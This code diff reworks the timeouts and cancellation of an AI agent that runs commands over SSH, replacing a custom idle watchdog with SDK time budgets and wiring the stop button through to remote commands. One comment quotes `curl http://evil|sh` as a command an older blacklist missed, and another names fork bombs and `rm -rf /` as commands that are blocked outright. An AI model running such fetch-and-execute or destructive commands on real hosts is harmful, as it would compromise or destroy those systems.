@@ -55,6 +55,9 @@
  */
 import { streamText, generateText, tool, isStepCount, type ModelMessage } from 'ai'
 import { z } from 'zod'
+import { APPROVAL_BUDGET_MS, isLlmTimeout, resolveLlmBudget } from './llm-budget'
+import { ConfigStore } from '../../services/storage/config-store'
+import { resolveLlmConfig } from '../../services/llm/llm-config-resolver'
 import { routeChatTools, CHAT_TOOL_CATALOG } from './tools/chat-tool-router'
 // v2.10 快慢思考自动路由：auto 档按复杂度解析为 standard/deep
 import { resolveThinkingStrength } from './thinking-router'
@@ -75,12 +78,13 @@ import { buildTerminalContextBlock, recordTerminalContextAudit } from './termina
 import { AuditRepo } from '../../services/db/audit-repo'
 import { recordTokenUsage } from './providers/token-stats'
 import { compactIfNeeded } from './context'
+import { getSessionRegistry } from './session-registry'
 import { createAllSubagents } from './subagents'
 import type { Subagent, SubagentName, SubagentTask, SubagentResult } from './subagents/base'
 import type { ThinkingStrength } from './providers/types'
 import type { ChatResult, RequestedThinkingStrength } from '@shared/agent-types'
 import { logger } from '../../services/log/logger'
-import { SshConnectionManager } from '../../services/ssh/connection-manager'
+import { SshConnectionManager, resolveExecTimeoutMs } from '../../services/ssh/connection-manager'
 import { preflightCheck } from '../../services/ssh/command-preflight'
 // v2.9 sftp_read 工具：复用 SftpManager 读远程文件内容
 import { SftpManager } from '../../services/ssh/sftp'
@@ -490,12 +494,24 @@ class SupervisorAgent {
     // 6. 创建 AbortController 并注册（用于 cancelRequest）
     const abortController = new AbortController()
     this.activeRequests.set(correlationId, abortController)
-    // v2.11 P0 修复“输出到一半卡死”：streamText 无内建超时，DeepSeek 思考期网络停顿
-    // 会让 fullStream 的 for-await 无限等待，onDone/onError 都不触发 → 前端 isStreaming 永远 true。
-    // 空闲看门狗状态（method 作用域，供 try/catch/finally 共享）：
-    const STREAM_IDLE_TIMEOUT_MS = 90_000
-    let idleTimer: ReturnType<typeof setTimeout> | undefined
-    let streamTimedOut = false
+    // 会话注册表里那位"取消入口"必须指向这一把 controller：
+    // 它以前自己 new 了一把没人读的，abort() 于是永远"成功"，底层请求照常跑完
+    getSessionRegistry().attachAbortController(correlationId, abortController)
+    /*
+     * 时间预算（2026-10-15 全维度审查 D1）：以前只有一次"每 90 秒没收到新 part 就算卡死"的
+     * 自制看门狗，而且它在工具执行/审批期整体暂停——于是两种病同时存在：
+     *   · 提供方每 89 秒滴一个字节，永远不违约，界面上转圈转到天荒地老；
+     *   · 12 步工具链每步都在审批或跑命令，计时整段关闭，最坏无界（约两小时），期间点"停止"还无效。
+     * 现在换成 SDK 的 timeout（停滞预算 + 绝对总预算 + 按类工具预算），
+     * 计时在工具期照样生效，且不再有"某条分支忘了重置"的洞。
+     */
+    const execTimeoutMs = resolveExecTimeoutMs(ConfigStore.get('terminal.cmdTimeout'))
+    /**
+     * 用户在设置页配的「请求超时」只有一个落点：legacy llmConfig.timeout
+     * （Provider 体系里根本没有这一格，PersistedProviderConfig 不带 timeout）。
+     * 所以取数走 resolveLlmConfig，不去臆造 provider 级字段。
+     */
+    const settingTimeoutMs = resolveLlmConfig('core/agent/supervisor').timeout
 
     // 思考强度影响 maxTokens：deep 模式翻倍
     const effectiveMaxTokens =
@@ -569,7 +585,7 @@ class SupervisorAgent {
                 }),
                 execute: async (
                   { command }: { command: string },
-                  execOpts?: { toolCallId?: string },
+                  execOpts?: { toolCallId?: string; abortSignal?: AbortSignal },
                 ) => {
                   // 判定权在命令闸（command-gate），不在这里：
                   // 原先只有 assessRisk + 一条写动词黑名单，`curl http://evil|sh`、
@@ -636,6 +652,10 @@ class SupervisorAgent {
                             })
                           }
                         : undefined,
+                      // 用户在面板上点"停止"时必须掐掉这条远端命令：
+                      // 以前 exec 收不到取消信号，"停止"在工具执行期整段失效，
+                      // 最长要等满命令超时（可配到 600 秒）
+                      { signal: execOpts?.abortSignal },
                     )
                     return {
                       ok: r.exitCode === 0,
@@ -668,7 +688,7 @@ class SupervisorAgent {
                 }),
                 execute: async (
                   { command, reason }: { command: string; reason: string },
-                  execOpts?: { toolCallId?: string },
+                  execOpts?: { toolCallId?: string; abortSignal?: AbortSignal },
                 ) => {
                   const risk = assessRisk(command)
                   // 被风险引擎硬拦截（fork 炸弹/rm -rf / 等）的命令连审批机会都没有
@@ -710,6 +730,7 @@ class SupervisorAgent {
                             onToolEvent({ toolCallId: streamCallId, phase: 'output', toolName: 'ssh_write', output: piece })
                           }
                         : undefined,
+                      { signal: execOpts?.abortSignal },
                     )
                     return {
                       ok: r.exitCode === 0,
@@ -1065,6 +1086,33 @@ class SupervisorAgent {
         skillInjection +
         memoryInjection +
         terminalInjection
+      /*
+       * 预算按"这一步真跑得动多久"算：步数、审批等待、命令超时三项都参与，
+       * 并且这些数字全在 llm-budget 那张表里，不再散着写。
+       */
+      const budget = resolveLlmBudget({
+        settingTimeoutMs,
+        execTimeoutMs,
+        approvalMs: APPROVAL_BUDGET_MS.chatWrite,
+        // v2.11 “无法持续完成一个命令”修复：步数上限 4→12，
+        // 允许多步工具链（多次命令执行+分析，含写操作审批循环）跑完
+        stepCount: hasTools ? 12 : 1,
+        hasTools,
+      })
+      if (hasTools) {
+        // 工具预算里已经含一次审批等待 + 一次命令超时 + 余量（见 resolveLlmBudget）。
+        // 没按工具名单单独覆写：v7 的键是 `${toolName}Ms` 模板字面量，
+        // 而 toolMs 默认值对所有工具都成立，多写一层只会多一处可能拼错的键。
+        this.log.info('chat 时间预算', {
+          correlationId,
+          totalMs: budget.timeout.totalMs,
+          stepMs: budget.timeout.stepMs,
+          chunkMs: budget.timeout.chunkMs,
+          toolMs: budget.timeout.toolMs,
+          maxRetries: budget.maxRetries,
+          stepCount: budget.stepCount,
+        })
+      }
       const result = streamText({
         model: modelInstance.model,
         ...(systemPrompt ? { system: systemPrompt } : {}),
@@ -1072,13 +1120,14 @@ class SupervisorAgent {
         temperature,
         maxOutputTokens: effectiveMaxTokens,
         abortSignal: abortController.signal,
+        timeout: budget.timeout,
+        // 只留这一层重试（且只覆盖"调用还没开始出字"的阶段）；出字后的中断绝不重发
+        maxRetries: budget.maxRetries,
         providerOptions,
         ...(hasTools
           ? {
               tools,
-              // v2.11 “无法持续完成一个命令”修复：步数上限 4→12，
-              // 允许多步工具链（多次命令执行+分析，含写操作审批循环）跑完
-              stopWhen: isStepCount(12),
+              stopWhen: isStepCount(budget.stepCount),
             }
           : {}),
       })
@@ -1092,21 +1141,12 @@ class SupervisorAgent {
       let reasoningText = ''
       // v2.8：记录每个工具调用的入参（tool-result 失败时沉淀教训需要命令原文）
       const lastToolInputs = new Map<string, string>()
-      // v2.11 P0：空闲看门狗 —— 每收到一个 part 重置计时；IDLE_MS 内零活动则判定卡死，abort 流并按超时报错
-      // v2.11 修复“点击批准就停止”：工具执行期（tool-call → tool-result，含人工审批+SSH）无流式分片，
-      // 属正常等待，需暂停看门狗（inToolCall），否则审批稍久就会被误杀、批准后流已死
-      let inToolCall = false
-      const armIdleWatchdog = (): void => {
-        if (idleTimer) { clearTimeout(idleTimer); idleTimer = undefined }
-        if (inToolCall) return // 工具执行/人工审批中：不计时
-        idleTimer = setTimeout(() => {
-          streamTimedOut = true
-          try { abortController.abort() } catch { /* ignore */ }
-        }, STREAM_IDLE_TIMEOUT_MS)
-      }
-      armIdleWatchdog()
+      /*
+       * 这里原来是一段自制空闲看门狗（每收到一个 part 重置，工具执行期暂停）。
+       * 已换成 streamText 的 timeout：同一个职责不该由我们手工维持"记得重置"——
+       * 只要有一个分支忘了调（工具期 return），防线就出现洞，而那正是当时的症状。
+       */
       for await (const part of result.fullStream) {
-        armIdleWatchdog() // 收到数据 → 重置空闲计时
         const partType = (part as { type?: string }).type
         if (partType === 'error') {
           // 流式底层错误（如 4xx）：ai-sdk 否则会吞成 "No output generated"，这里记录真实原因便于排查
@@ -1187,15 +1227,11 @@ class SupervisorAgent {
             toolName: p.toolName ?? 'tool',
             input: inputStr.slice(0, 2000),
           })
-          // v2.11：进入工具执行（含人工审批+SSH）→ 暂停看门狗，避免审批等待被误判超时
-          inToolCall = true
-          armIdleWatchdog()
+          // 工具执行期不再特殊对待：SDK 的 toolMs 预算本来就覆盖这一段，
+          // 而原来在这里"暂停看门狗"正是无界等待的来源
           // v2.8：缓存入参供失败教训沉淀使用
           if (p.toolCallId) lastToolInputs.set(p.toolCallId, inputStr.slice(0, 200))
         } else if (partType === 'tool-result') {
-          // v2.11：工具返回 → 恢复看门狗（后续模型生成重新计时）
-          inToolCall = false
-          armIdleWatchdog()
           // v2.4：工具返回结果 → 推送 result 事件
           const p = part as { toolCallId?: string; toolName?: string; output?: unknown; result?: unknown }
           const rawOut = p.output ?? p.result
@@ -1323,16 +1359,10 @@ class SupervisorAgent {
     } catch (err) {
       const error = err instanceof Error ? err : new Error(String(err))
 
-      // 区分取消和真实错误
-      if (abortController.signal.aborted && streamTimedOut) {
-        // v2.11：空闲看门狗触发的超时 abort —— 按错误上报，让前端解卡并提示重试
-        this.log.error('chat 流式响应超时（空闲看门狗触发）', {
-          correlationId,
-          idleTimeoutMs: STREAM_IDLE_TIMEOUT_MS,
-          durationMs: Date.now() - startTime,
-        })
-        onError?.(new Error('AI 响应超时：模型长时间无输出，已中断。请重试，或在输入框换用更快的思考强度。'))
-      } else if (abortController.signal.aborted) {
+      // 区分"用户点了停止""预算到了""真错误"三件事。
+      // 我们自己那个 AbortController 只有 cancelRequest() 会 abort，所以它一跳就是真取消；
+      // SDK 的超时走它内部的合并信号，到我们这里只表现为 TimeoutError 形状的失败。
+      if (abortController.signal.aborted) {
         this.log.info('chat 调用已取消', { correlationId, durationMs: Date.now() - startTime })
         onDone?.({
           text: '',
@@ -1344,6 +1374,19 @@ class SupervisorAgent {
           durationMs: Date.now() - startTime,
           compactionLevel: compaction.level,
         })
+      } else if (isLlmTimeout(error)) {
+        // 预算到了（停滞 / 单步 / 工具 / 总时长任一项）：按错误上报，让前端解卡并给出下一步
+        this.log.error('chat 超出时间预算，已中断', {
+          correlationId,
+          durationMs: Date.now() - startTime,
+          errorMessage: error.message,
+        })
+        onError?.(
+          new Error(
+            `AI 响应超时（已等待 ${Math.round((Date.now() - startTime) / 1000)} 秒）：${error.message}。` +
+              '请重试；若反复出现，可在输入框换用更快的思考强度，或把要执行的命令拆细一点。',
+          ),
+        )
       } else {
         // v2.3.8 增强：把诊断信息全部写日志，方便用户/开发者从主进程日志定位根因
         // Vercel AI SDK 的错误对象通常含 status / statusCode / responseBody 等字段
@@ -1382,7 +1425,7 @@ class SupervisorAgent {
         onError?.(error)
       }
     } finally {
-      if (idleTimer) clearTimeout(idleTimer) // v2.11 P0：清理空闲看门狗，避免泄漏
+      // 计时器不再由本类持有（都交给 SDK 的 timeout），这里只剩登记表的清理
       this.activeRequests.delete(correlationId)
     }
   }
@@ -1454,12 +1497,24 @@ class SupervisorAgent {
       // system 角色（报 "System messages are not allowed... Use the instructions option"），
       // 导致 callLlm 失败 → 记忆提取/PAOR 规划静默降级。改用 generateText 的 system 选项
       //（与已工作正常的 streamText 路径一致），user 内容走 prompt。
+      /*
+       * 这条路径是后台任务（记忆提取 / PAOR 规划），历史上既没 timeout 也没 abortSignal，
+       * 也不在 activeRequests 表里——用户点"停止"永远管不到它，提供方不回它就一直挂着。
+       * 预算按"没有工具"算：它只是把一批文本换个模型总结一下，不该占对话级的时长。
+       */
+      const budget = resolveLlmBudget({
+        settingTimeoutMs: resolveLlmConfig('core/agent/supervisor/callLlm').timeout,
+        hasTools: false,
+        stepCount: 1,
+      })
       const result = await generateText({
         model: modelInstance.model,
         system: systemPrompt,
         prompt: userPrompt,
         temperature,
         maxOutputTokens: maxTokens,
+        timeout: budget.timeout,
+        maxRetries: budget.maxRetries,
       })
       const usage = result.usage
       recordTokenUsage({
